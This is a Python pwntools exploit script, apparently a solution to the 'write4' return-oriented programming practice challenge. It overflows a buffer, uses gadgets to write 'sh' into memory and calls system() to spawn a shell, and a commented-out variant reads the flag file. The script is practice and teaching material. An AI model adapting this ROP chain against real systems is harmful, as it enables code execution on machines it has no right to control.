# -*- coding: utf-8 -*-
from pwn import *
p = process('./write4')
p.recvuntil("> ")
# ROPgadget --binary ./write4 --only "mov|ret"
# 0x0000000000400820 : mov qword ptr [r14], r15 ; ret
mov_r14_r15 = 0x0000000000400820
# ROPgadget --binary ./write4 --only "pop|ret"
# 0x0000000000400890 : pop r14 ; pop r15 ; ret
pop_r14_r15_ret = 0x0000000000400890
pop_rdi_ret = 0x0000000000400893
bss_addr = 0x0000000000601060
call_system = 0x4005E0
# cat_flag = ["cat flag",".txt".ljust(8, "\x00")]
get_sh = "sh".ljust(8, "\x00")

payload = "a" * 40 
# for x in xrange(0, 2):
#     payload += p64(pop_r14_r15_ret)
#     payload += p64(bss_addr + x * 8)
#     payload += cat_flag[x]
#     payload += p64(mov_r14_r15)

payload += p64(pop_r14_r15_ret)
payload += p64(bss_addr)
payload += get_sh
payload += p64(mov_r14_r15)

payload += p64(pop_rdi_ret)
payload += p64(bss_addr)
payload += p64(call_system)

p.sendline(payload)
p.interactive()


